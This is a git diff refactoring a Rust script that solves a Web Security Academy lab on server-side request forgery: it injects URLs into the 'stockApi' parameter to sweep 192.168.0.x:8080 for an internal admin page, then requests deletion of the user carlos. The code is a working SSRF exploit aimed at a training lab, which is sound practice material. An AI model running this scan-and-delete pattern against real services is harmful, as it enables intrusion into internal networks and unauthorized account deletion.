@@ -1,22 +1,15 @@
-/***************************************************************************************
-*
-* Author: Ahmed Elqalaawy (@elqal3awii)
-*
-* Date: 18/10/2023
+/************************************************************
 *
 * Lab: Basic SSRF against another back-end system
 *
-* Steps: 1. Inject payload into 'stockApi' parameter to scan the internal network
-*        2. Delete carlos from the admin interface
+* Hack Steps:
+*      1. Inject payload into 'stockApi' parameter to scan
+*         the internal network
+*       2. Delete carlos from the admin interface
 *
-****************************************************************************************/
-#![allow(unused)]
-/***********
-* Imports
-***********/
+*************************************************************/
 use reqwest::{
     blocking::{Client, ClientBuilder, Response},
-    header::HeaderMap,
     redirect::Policy,
 };
 use std::{
@@ -27,88 +20,59 @@ use std::{
 };
 use text_colorizer::Colorize;
 
-/******************
-* Main Function
-*******************/
+// Change this to your lab URL
+const LAB_URL: &str = "https://0a6800f903fe3b4184ef0b2900d300a1.web-security-academy.net";
+
 fn main() {
-    // change this to your lab URL
-    let url = "https://0a4a00f604dac6e8828d75be00e20062.web-security-academy.net";
+    println!("⦗#⦘ Injection point: {}", "stockApi".yellow());
 
-    // build the client that will be used for all subsequent requests
-    let client = build_client();
-
-    println!("{} {}", "⟪#⟫ Injection point:".blue(), "stockApi".yellow(),);
-
-    // string that will hold the payload
-    let mut payload = String::new();
-
-    // iterate over all possible numbers
     for x in 0..255 {
-        // payload to scan the internal network
-        payload = format!("http://192.168.0.{x}:8080/admin");
+        let payload = format!("http://192.168.0.{x}:8080/admin");
 
         print!(
-            "\r{} ({}).. ",
-            "⦗1⦘ Injecting payload to scan the internal netwrok".white(),
-            format!("192.168.0.{x}:8080/admin").yellow()
+            "\r⦗1⦘ Injecting payload to scan the internal netwrok ({}).. ",
+            payload.yellow()
         );
-        io::stdout().flush();
+        flush_terminal();
 
-        // fetch the page with the injected payload
-        let res = client
-            .post(format!("{url}/product/stock"))
-            .form(&HashMap::from([("stockApi", &payload)]))
-            .send()
-            .expect(&format!(
-                "{}",
-                "[!] Failed to fetch the page with the injected payload".red()
-            ));
+        let check_stock = check_stock_with_payload(&payload);
 
-        // if you found the internal server
-        if res.status().as_u16() == 200 {
+        if check_stock.status().as_u16() == 200 {
             println!("{}", "OK".green());
-            print!(
-                "{}",
-                "⦗2⦘ Deleting carlos from the admin interface.. ".white(),
-            );
-            io::stdout().flush();
+            print!("⦗2⦘ Deleting carlos from the admin interface.. ");
+            flush_terminal();
 
-            // delete carlos
-            client
-                .post(format!("{url}/product/stock"))
-                .form(&HashMap::from([(
-                    "stockApi",
-                    format!("{payload}/delete?username=carlos"),
-                )]))
-                .send()
-                .expect(&format!(
-                    "{}",
-                    "[!] Failed to delete carlos from the admin interface".red()
-                ));
+            let new_payload = format!("{payload}/delete?username=carlos");
+            check_stock_with_payload(&new_payload);
 
             println!("{}", "OK".green());
-            println!(
-                "{} {}",
-                "🗹 The lab should be marked now as"
-                    .white()
-                    .bold(),
-                "solved".green().bold()
-            );
-
-            // exit from the program
+            println!("🗹 The lab should be marked now as {}", "solved".green());
             process::exit(0);
         }
     }
 }
 
-/*******************************************************************
-* Function used to build the client
-* Return a client that will be used in all subsequent requests
-********************************************************************/
-fn build_client() -> Client {
+fn check_stock_with_payload(payload: &str) -> Response {
+    let cliet = build_web_client();
+    cliet
+        .post(format!("{LAB_URL}/product/stock"))
+        .form(&HashMap::from([("stockApi", &payload)]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "⦗!⦘ Failed to fetch the page with the injected payload".red()
+        ))
+}
+
+fn build_web_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
         .connect_timeout(Duration::from_secs(5))
         .build()
         .unwrap()
+}
+
+#[inline(always)]
+fn flush_terminal() {
+    io::stdout().flush().unwrap();
 }
